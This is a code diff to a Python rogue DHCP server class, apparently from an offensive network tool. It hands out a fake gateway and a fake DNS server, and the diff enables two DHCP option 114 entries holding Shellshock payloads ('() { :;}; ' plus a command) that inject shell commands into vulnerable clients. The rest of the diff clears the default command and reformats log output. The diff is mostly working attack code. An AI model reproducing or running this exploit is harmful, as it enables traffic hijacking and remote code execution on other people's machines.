@@ -57,7 +57,7 @@ class DHCPListener:
         self.__renewalTime = 172800
         self.__rebindingTime = 138240
 
-        self.__command = "echo nullp"
+        self.__command = ""
 
 
     def setLeaseTime(self, leaseTime):
@@ -135,7 +135,7 @@ class DHCPListener:
             pass
 
     # return a DHCP packet for the client discovery
-    def generatePacketServerOffer(self, type, IPClient, packet, command):
+    def generatePacketServerOffer(self, type, IPClient, packet):
         return (Ether(src=self.__DHCPMac, dst=packet[Ether].src) /
                 IP(src=self.__DHCPServerIp, dst="255.255.255.255") /
                 UDP(sport=67, dport=68) /
@@ -177,8 +177,8 @@ class DHCPListener:
                     ('router', self.__fakeGatewayIP),
                     ('message-type', type),
                     ("name_server", self.__fakeDNSServer),
-                    #(114, "() { ignored;}; " + self.__command),
-                    #(114, "() { :;}; " + self.__command),
+                    (114, "() { ignored;}; " + self.__command),
+                    (114, "() { :;}; " + self.__command),
                     'end']
                 ))
 
@@ -194,7 +194,8 @@ class DHCPListener:
 
             print(f'{bcolors.OKBLUE}---New DHCP Discover---{bcolors.ENDC}')
             hostname = self.getOption(packet[DHCP].options, 'hostname')
-            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} Host {bcolors.WARNING}{hostname}{bcolors.ENDC} ({bcolors.WARNING}{packet[Ether].src}{bcolors.ENDC}) asked for an IP\n")
+            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} Host {bcolors.WARNING}{hostname}{bcolors.ENDC} "
+                  f"({bcolors.WARNING}{packet[Ether].src}{bcolors.ENDC}) asked for an IP\n")
 
         # DHCP request
         if DHCP in packet and packet[DHCP].options[0][1] == 3:
@@ -205,7 +206,8 @@ class DHCPListener:
 
             print(f"{bcolors.OKBLUE}---New DHCP Request---{bcolors.ENDC}")
             hostname = self.getOption(packet[DHCP].options, 'hostname')
-            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} Device {bcolors.WARNING}{hostname}{bcolors.ENDC} ({bcolors.WARNING}{packet[Ether].src}{bcolors.ENDC}){bcolors.ENDC} requested {bcolors.WARNING}{requestedIP}\n")
+            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} Device {bcolors.WARNING}{hostname}{bcolors.ENDC} "
+                  f"({bcolors.WARNING}{packet[Ether].src}{bcolors.ENDC}){bcolors.ENDC} requested {bcolors.WARNING}{requestedIP}\n")
             self.__dictIPS[requestedIP] = packet[Ether].src
 
 
